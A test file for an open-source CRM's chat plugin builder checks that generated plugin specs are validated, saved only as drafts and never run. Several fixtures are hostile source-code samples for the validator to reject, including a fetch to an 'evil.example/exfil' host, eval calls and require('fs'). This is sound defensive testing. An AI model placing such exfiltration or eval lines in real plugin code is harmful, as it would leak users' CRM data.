// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 John Coles - The Open CRM
// This file is part of The Open CRM, free software under the GNU AGPL v3.0 or
// later. See the LICENSE file at the repository root, or
// https://www.gnu.org/licenses/agpl-3.0.html. Distributed WITHOUT ANY WARRANTY.

// Chat plugin builder — build-your-own-tool from chat (confirm-first).
//
// Three layers, mirroring the established suites:
//   A. Pure chatActions.validateAction on the plugin.create_draft spec
//      (chatActions.test.js pattern — no DB). The spec's `check` runs the
//      generated output through services/pluginSpecValidator, so an unchecked
//      spec can never become a proposal OR an applied row.
//   B. The propose_build_plugin tool via the test-only _buildChatToolRunner
//      (runPluginTool.test.js pattern): flag-off inertness, generator reuse,
//      validator screening, and — critically — that proposing NEVER saves and
//      NEVER runs anything.
//   C. POST /api/ai/actions/apply for plugin.create_draft
//      (chatControlPlane.test.js pattern): saves a status='draft' org-scoped
//      row only, re-rejects tampered/dangerous specs, re-checks the module
//      flag, and never touches the plugin runner.

// describe / test / expect / beforeEach / vi are vitest globals.

const realPool = require('../db');
const mockPool = realPool;
mockPool.query   = vi.fn();
mockPool.connect = vi.fn();

vi.mock('../services/usageMeter', () => ({
  increment:     vi.fn().mockResolvedValue(null),
  recordAiUsage: vi.fn().mockResolvedValue(null),
}));
vi.mock('../services/aiMetering', () => ({
  recordUsage: vi.fn().mockResolvedValue(null),
}));
vi.mock('../services/quotaEnforcer', () => {
  class QuotaExceeded extends Error {}
  return {
    QuotaExceeded,
    getSeatCount: vi.fn().mockResolvedValue(1),
    checkAiQuota: vi.fn().mockResolvedValue(null),
  };
});

process.env.ANTHROPIC_API_KEY = 'test-key-for-vitest';

const express = require('express');
const cookieParser = require('cookie-parser');
const request = require('supertest');

// Live-export patches (the requireAiBilling.test.js pattern): the route
// resolves these at call time via property lookup, so the stubs are what run.
const featureFlags = require('../services/featureFlags');
featureFlags.hasFeature = vi.fn();

const pluginGenerator = require('../services/pluginGenerator');
const generatorSpy = vi.fn();
pluginGenerator.generatePluginSpec = generatorSpy;

// The runner must NEVER be touched by the builder flow — spy to prove it.
const pluginRunner = require('../services/pluginRunner');
const runnerSpy = vi.fn();
pluginRunner.run = runnerSpy;

const audit = require('../services/audit');
audit.record  = vi.fn().mockResolvedValue(null);
audit.fromReq = vi.fn();

const logger = require('../services/logger');
logger.info  = vi.fn();
logger.warn  = vi.fn();
logger.error = vi.fn();

const chatActions = require('../services/chatActions');
const aiRoutes = require('../routes/aiRoutes');
const ai = require('../services/ai');
const { generateToken, AUTH_COOKIE_NAME } = require('../auth');

const USER_ID = 4242;
const ORG_ID = 7;

// A generated spec that passes pluginSpecValidator end to end.
function validGeneratedSpec(overrides = {}) {
  return {
    name: 'stalled-deal-flagger',
    description: 'Flags deals stuck 30 days and creates a follow-up task.',
    trigger_event: 'schedule.daily',
    source_kind: 'conversational',
    spec_json: {
      summary: 'Flags deals stuck 30 days and creates a follow-up task.',
      triggerEvent: 'schedule.daily',
      triggerFilter: null,
      actions: [{ kind: 'create_task', title: 'Follow up on stalled deal' }],
    },
    source_code: "const deals = await crm.listDeals({ stale_days: 30 }); for (const d of deals) { await crm.createTask({ title: 'Follow up: ' + d.title, deal_id: d.id }); } return { flagged: deals.length };",
    ...overrides,
  };
}

// The proposal fields shape the propose handler emits / the apply endpoint eats.
function draftFields(overrides = {}) {
  const s = validGeneratedSpec();
  return {
    name: s.name,
    description: s.description,
    trigger_event: s.trigger_event,
    spec_json: s.spec_json,
    source_code: s.source_code,
    ...overrides,
  };
}

function buildReq(overrides = {}) {
  return {
    orgId: ORG_ID,
    userId: USER_ID,
    orgRole: 'member',
    adminRole: null,
    log: { warn: vi.fn(), error: vi.fn(), info: vi.fn() },
    headers: {},
    ip: '127.0.0.1',
    ...overrides,
  };
}

function buildApp() {
  const app = express();
  app.use(express.json());
  app.use(cookieParser(process.env.COOKIE_SECRET));
  app.use('/api/ai', aiRoutes);
  return app;
}

function authCookie() {
  return [`${AUTH_COOKIE_NAME}=${generateToken(USER_ID)}`];
}

async function postApply(proposal) {
  return request(buildApp())
    .post('/api/ai/actions/apply')
    .set('Cookie', authCookie())
    .send({ proposal });
}

// Content-dispatched pool stub for the apply flow. Handlers are checked in
// order before the auth-row default.
function stubPool(handlers = []) {
  mockPool.query.mockImplementation((sql, params) => {
    const s = String(sql);
    for (const [re, rows] of handlers) {
      if (re.test(s)) {
        const out = typeof rows === 'function' ? rows(s, params) : rows;
        return Promise.resolve({ rows: out });
      }
    }
    if (/FROM users WHERE id/i.test(s)) {
      return Promise.resolve({ rows: [{ org_id: ORG_ID, org_role: 'member', status: 'active' }] });
    }
    return Promise.resolve({ rows: [] });
  });
}

beforeEach(() => {
  mockPool.query.mockReset();
  mockPool.connect.mockReset();
  featureFlags.hasFeature.mockReset();
  featureFlags.hasFeature.mockResolvedValue(true); // plugins ON by default
  generatorSpy.mockReset();
  runnerSpy.mockReset();
  audit.fromReq.mockClear();
});

// ===========================================================================
// A. validateAction — plugin.create_draft (pure, validator-gated)
// ===========================================================================
describe('chatActions.validateAction — plugin.create_draft', () => {
  test('a valid generated spec passes; summary says DRAFT and never-auto-runs', () => {
    const v = chatActions.validateAction({
      entity: 'plugin', op: 'create_draft', fields: draftFields(),
    });
    expect(v.ok).toBe(true);
    expect(v.action.summary).toMatch(/DRAFT/);
    expect(v.action.summary).toMatch(/never runs automatically/i);
  });

  test('unknown trigger_event is rejected by the plugin spec validator', () => {
    const v = chatActions.validateAction({
      entity: 'plugin', op: 'create_draft',
      fields: draftFields({
        trigger_event: 'org.self_destruct',
        spec_json: { ...draftFields().spec_json, triggerEvent: 'org.self_destruct' },
      }),
    });
    expect(v.ok).toBe(false);
    expect(v.errors.join(' ')).toMatch(/trigger_event/);
  });

  test('dangerous source_code (fetch / eval / require) is rejected', () => {
    for (const evil of [
      "await fetch('https://evil.example/exfil');",
      "eval('process.exit(1)');",
      "const fs = require('fs');",
    ]) {
      const v = chatActions.validateAction({
        entity: 'plugin', op: 'create_draft',
        fields: draftFields({ source_code: evil }),
      });
      expect(v.ok, `should reject: ${evil}`).toBe(false);
      expect(v.errors.join(' ')).toMatch(/plugin spec source_code/);
    }
  });

  test('a non-allowlisted SDK method is rejected', () => {
    const v = chatActions.validateAction({
      entity: 'plugin', op: 'create_draft',
      fields: draftFields({ source_code: 'await crm.deleteEverything();' }),
    });
    expect(v.ok).toBe(false);
    expect(v.errors.join(' ')).toMatch(/unknown SDK method/);
  });

  test('a smuggled status field cannot make the draft active', () => {
    const v = chatActions.validateAction({
      entity: 'plugin', op: 'create_draft',
      fields: draftFields({ status: 'active' }),
    });
    expect(v.ok).toBe(false);
    expect(v.errors.join(' ')).toMatch(/status/);
  });

  test('source_code and spec_json are required', () => {
    const noCode = draftFields();
    delete noCode.source_code;
    expect(chatActions.validateAction({ entity: 'plugin', op: 'create_draft', fields: noCode }).ok).toBe(false);

    const noSpec = draftFields();
    delete noSpec.spec_json;
    expect(chatActions.validateAction({ entity: 'plugin', op: 'create_draft', fields: noSpec }).ok).toBe(false);
  });

  test('plugin.create_draft is a service action — the generic table writer refuses it', async () => {
    const v = chatActions.validateAction({
      entity: 'plugin', op: 'create_draft', fields: draftFields(),
    });
    expect(v.ok).toBe(true);
    await expect(
      chatActions.applyAction({ query: vi.fn() }, v.action, { sf: 'org_id', sv: ORG_ID, userId: USER_ID, orgId: ORG_ID })
    ).rejects.toThrow(/service action/);
  });
});

// ===========================================================================
// B. propose_build_plugin — the confirm-first draft proposal (never writes)
// ===========================================================================
describe('propose_build_plugin chat tool', () => {
  test('flag off → FEATURE_DISABLED and the generator is never called (inert by default)', async () => {
    featureFlags.hasFeature.mockResolvedValue(false);
    const runTool = aiRoutes._buildChatToolRunner(buildReq());
    const out = await runTool('propose_build_plugin', { description: 'flag deals stuck 30 days and create follow-up tasks' });
    expect(out.code).toBe('FEATURE_DISABLED');
    expect(out.feature).toBe('plugins_enabled');
    expect(generatorSpy).not.toHaveBeenCalled();
    expect(mockPool.query).not.toHaveBeenCalled();
  });

  test('happy path: returns a validated draft proposal and saves/runs NOTHING', async () => {
    generatorSpy.mockResolvedValueOnce({ ok: true, spec: validGeneratedSpec() });
    const runTool = aiRoutes._buildChatToolRunner(buildReq());
    const out = await runTool('propose_build_plugin', { description: 'flag deals stuck 30 days and create follow-up tasks' });

    expect(out.proposal).toBeDefined();
    expect(out.proposal.entity).toBe('plugin');
    expect(out.proposal.op).toBe('create_draft');
    expect(out.proposal.fields.name).toBe('stalled-deal-flagger');
    expect(out.proposal.summary).toMatch(/DRAFT/);
    expect(out.spec_preview.action_kinds).toEqual(['create_task']);
    expect(out.note).toMatch(/Nothing has been saved or run/);

    // Reuses the shared generator, tagged for chat metering.
    expect(generatorSpy).toHaveBeenCalledWith(expect.objectContaining({
      orgId: ORG_ID, userId: USER_ID, endpoint: 'chat-plugin-builder',
    }));

    // THE core guarantee: proposing writes nothing and runs nothing.
    const sqls = mockPool.query.mock.calls.map((c) => String(c[0]));
    expect(sqls.some((s) => /INSERT|UPDATE|DELETE/i.test(s))).toBe(false);
    expect(runnerSpy).not.toHaveBeenCalled();
  });

  test('an invalid generated spec is rejected by the validator — no proposal minted', async () => {
    generatorSpy.mockResolvedValueOnce({
      ok: true,
      spec: validGeneratedSpec({ source_code: "await fetch('https://evil.example');" }),
    });
    const runTool = aiRoutes._buildChatToolRunner(buildReq());
    const out = await runTool('propose_build_plugin', { description: 'exfiltrate all my deals to a webhook please' });
    expect(out.code).toBe('SPEC_REJECTED');
    expect(out.proposal).toBeUndefined();
    expect(out.validation_errors.join(' ')).toMatch(/fetch/);
    const sqls = mockPool.query.mock.calls.map((c) => String(c[0]));
    expect(sqls.some((s) => /INSERT/i.test(s))).toBe(false);
  });

  test('too-short description fails fast without burning an AI call', async () => {
    const runTool = aiRoutes._buildChatToolRunner(buildReq());
    const out = await runTool('propose_build_plugin', { description: 'a tool' });
    expect(out.error).toBe('invalid');
    expect(generatorSpy).not.toHaveBeenCalled();
  });

  test('AI not configured surfaces honestly', async () => {
    generatorSpy.mockResolvedValueOnce({ ok: false, configured: false });
    const runTool = aiRoutes._buildChatToolRunner(buildReq());
    const out = await runTool('propose_build_plugin', { description: 'flag deals stuck 30 days and create follow-up tasks' });
    expect(out.code).toBe('AI_NOT_CONFIGURED');
  });

  test('the tool is registered in CHAT_TOOLS with a strict schema', () => {
    const tool = ai.CHAT_TOOLS.find((t) => t.name === 'propose_build_plugin');
    expect(tool).toBeDefined();
    expect(tool.input_schema.required).toEqual(['description']);
    expect(tool.input_schema.additionalProperties).toBe(false);
    expect(tool.description).toMatch(/does NOT save or run/i);
  });
});

// ===========================================================================
// C. POST /api/ai/actions/apply — plugin.create_draft (the save-only writer)
// ===========================================================================
describe('actions/apply — plugin.create_draft', () => {
  test('saves an org-scoped draft row (status=draft) and returns the open path', async () => {
    let insertSql = null;
    let insertParams = null;
    stubPool([
      [/SELECT 1 FROM plugins WHERE org_id/i, []], // no name collision
      [/INSERT INTO plugins/i, (s, p) => {
        insertSql = s; insertParams = p;
        return [{ id: 55, name: 'stalled-deal-flagger', public_id: 'pub-55', status: 'draft', source_kind: 'conversational', description: 'x', trigger_event: 'schedule.daily' }];
      }],
    ]);

    const res = await postApply({ entity: 'plugin', op: 'create_draft', fields: draftFields() });
    expect(res.status).toBe(200);
    expect(res.body.ok).toBe(true);
    expect(res.body.applied.status).toBe('draft');
    expect(res.body.applied.plugin_id).toBe(55);
    expect(res.body.applied.open_path).toBe('/plugins/55');

    // The INSERT itself hard-codes 'draft' + 'conversational' and scopes to
    // the caller's org — the client cannot influence any of the three.
    expect(insertSql).toMatch(/'draft'/);
    expect(insertSql).toMatch(/'conversational'/);
    expect(insertParams[0]).toBe(ORG_ID);

    // Saving a draft never executes it.
    expect(runnerSpy).not.toHaveBeenCalled();
    expect(audit.fromReq).toHaveBeenCalledWith(expect.anything(), expect.objectContaining({ targetType: 'plugin', targetId: 55 }));
  });

  test('flag re-checked at apply: plugins_enabled off → 403 FEATURE_DISABLED, no insert', async () => {
    featureFlags.hasFeature.mockResolvedValue(false);
    stubPool();
    const res = await postApply({ entity: 'plugin', op: 'create_draft', fields: draftFields() });
    expect(res.status).toBe(403);
    expect(res.body.code).toBe('FEATURE_DISABLED');
    const sqls = mockPool.query.mock.calls.map((c) => String(c[0]));
    expect(sqls.some((s) => /INSERT INTO plugins/i.test(s))).toBe(false);
  });

  test('a tampered echoed proposal (dangerous code) is re-rejected — no unchecked spec reaches the table', async () => {
    stubPool();
    const res = await postApply({
      entity: 'plugin', op: 'create_draft',
      fields: draftFields({ source_code: "eval('anything')" }),
    });
    expect(res.status).toBe(400);
    expect(res.body.validation_errors.join(' ')).toMatch(/eval/);
    const sqls = mockPool.query.mock.calls.map((c) => String(c[0]));
    expect(sqls.some((s) => /INSERT INTO plugins/i.test(s))).toBe(false);
  });

  test('name collision is suffixed instead of failing', async () => {
    let insertParams = null;
    let collisionCalls = 0;
    stubPool([
      [/SELECT 1 FROM plugins WHERE org_id/i, () => (collisionCalls++ === 0 ? [{ 1: 1 }] : [])],
      [/INSERT INTO plugins/i, (s, p) => {
        insertParams = p;
        return [{ id: 56, name: p[1], public_id: 'pub-56', status: 'draft', source_kind: 'conversational', description: 'x', trigger_event: 'schedule.daily' }];
      }],
    ]);
    const res = await postApply({ entity: 'plugin', op: 'create_draft', fields: draftFields() });
    expect(res.status).toBe(200);
    expect(insertParams[1]).toBe('stalled-deal-flagger (Draft)');
  });

  test('org-less personal workspace cannot save a plugin draft', async () => {
    mockPool.query.mockImplementation((sql) => {
      const s = String(sql);
      if (/FROM users WHERE id/i.test(s)) {
        return Promise.resolve({ rows: [{ org_id: null, org_role: null, status: 'active' }] });
      }
      return Promise.resolve({ rows: [] });
    });
    const res = await postApply({ entity: 'plugin', op: 'create_draft', fields: draftFields() });
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/Org context required/);
  });
});
